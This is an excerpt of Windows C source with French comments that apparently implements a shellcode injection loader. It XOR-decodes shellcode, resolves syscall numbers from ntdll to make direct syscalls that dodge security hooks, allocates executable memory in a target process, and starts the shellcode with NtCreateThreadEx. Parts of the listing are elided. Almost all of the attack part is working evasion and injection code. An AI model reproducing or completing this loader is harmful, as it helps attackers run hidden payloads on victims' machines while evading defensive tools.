...
#include <windows.h>
#include "easy5.h"
#include <tlhelp32.h>  // <-- AJOUTER pour EnumProcessModules
#include <psapi.h>     // <-- AJOUTER pour les fonctions processus
...
//fonction xor
BOOL EncryptXor(unsigned char* shellcode, unsigned char bKey, int ShellSize) {
...
//---------------------FindSSN---------------------
//cette fonction prend un handle sur le ntdll, et prend une variable qui contiendra le SSN de la fonction
DWORD FindSSN(HANDLE hNTDLL, LPCSTR NtFunction) {

    DWORD NtFunctionSSN = NULL; 

    UINT_PTR pNtFunction = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);
    if (pNtFunction == NULL) {
        printf("Impossible d'avoir l'adresse de la NtFonction:  %d\n", GetLastError());
        return -1;
    }

    NtFunctionSSN = ((unsigned char*)(pNtFunction + 4))[0]; 
    if (NtFunctionSSN == NULL) {
        printf("Impossible d'avoir l'adresse de la NtFonction dans le ntdll.dll:  %d\n", GetLastError());
        return -1;
    }
...
//variable qui contiendra les syscall numbers
  //on doit récupérer les SSN des fonctions
...
int main(int argc, char* argv[]) {
    ...
    NtQuerySystemInformationSSN = FindSSN(hNTDLL, NtQuerySystemInformation);
        ...
        EncryptXor(shellcode, bkey, shell_size);
        ...
        STATUS = NtAllocateVirtualMemory(hProcess, &ShellcodeAddress, NULL, &shell_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        if (STATUS == EXIT_FAILURE) {
        ...
        STATUS = NtCreateThreadEx(&hthread, THREAD_ALL_ACCESS, &OA, hProcess, (PTHREAD_START_ROUTINE)ShellcodeAddress, NULL, 0, 0, 0, 0, NULL);
        if (STATUS == EXIT_FAILURE) {
